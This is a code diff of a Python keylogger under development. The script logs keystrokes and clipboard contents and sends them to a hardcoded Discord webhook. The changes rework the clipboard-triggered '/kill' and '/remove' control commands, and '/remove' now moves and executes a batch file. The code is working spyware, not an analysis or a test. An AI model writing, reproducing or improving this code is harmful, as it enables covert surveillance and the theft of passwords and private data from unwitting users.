@@ -6,6 +6,7 @@ import time
 from pynput import keyboard
 import psutil
 import pyperclip
+import shutil
 
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
@@ -89,33 +90,38 @@ def on_press(key):
         keystrokes += key_str
         last_keypress_time = time.time()
 
-pyperclip.copy("")
+
 def on_release(key):
-    global last_clipboard
-    # Don't perform any action until a significant clipboard change is detected
     current_clipboard = pyperclip.paste()
 
-    if current_clipboard != last_clipboard:
-        last_clipboard = current_clipboard
-        if "/kill" in current_clipboard:
-            send_to_webhook(f"Kill command executed by: {username}")
-            file_path = rf"C:\users\{username}\kl2.1"
-            subprocess.run(["explorer", file_path])
-            time.sleep(1)
-            send_to_webhook(f"Opened dir...")
-            return False
+    if "/kill" in current_clipboard:
+        send_to_webhook(f"Kill command executed by: {username}")
+        file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
+        subprocess.run(["explorer", file_path])
+        time.sleep(1)
+        send_to_webhook(f"Opened dir...")
+        return False
 
-        elif "/remove" in current_clipboard:
-            send_to_webhook(f"Removed by: {username}")
-            file_path = rf"C:\users\{username}\kl2.1"
-            try:
-                os.rmdir(file_path)
-                send_to_webhook(f"Directory removed: {file_path}")
-            except OSError as e:
-                send_to_webhook(f"Error removing directory: {e}")
-            return False
+    elif "/remove" in current_clipboard:  # Corrected from 'else if' to 'elif'
+        send_to_webhook(f"Removed by: {username}")
+        file_path = rf"C:\users\{username}\kl2.1"
+        try:
+            source = rf"C:\users\{username}\kl2.1\runkill.bat"
+            destination = r"C:\path\to\new\location\runkill.bat"
 
-    return True
+            # Ensure the source file exists before attempting to move it
+            if os.path.exists(source):
+                shutil.move(source, destination)
+                subprocess.run([destination], check=True)  # Run the moved .bat file
+                send_to_webhook(f"Moved and executed the .bat file: {destination}")
+            else:
+                send_to_webhook(f"Error: {source} not found")
+
+        except OSError as e:
+            send_to_webhook(f"Error moving or executing the .bat file: {e}")
+
+        return False
+
 
 def monitor_clipboard():
     """Monitor the clipboard for changes and send the content to the webhook."""
@@ -125,12 +131,11 @@ def monitor_clipboard():
         try:
             current_clipboard = pyperclip.paste()
             if current_clipboard != last_clipboard:
-                send_to_webhook(f"{username} just copied something to clipboard!")
+                send_to_webhook(f" {username} just copied something to clipboard!")
                 send_to_webhook(f"Clipboard content: {current_clipboard}")
                 last_clipboard = current_clipboard
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
-
 
 # Run kill.bat file at the start
 run_bat_file()
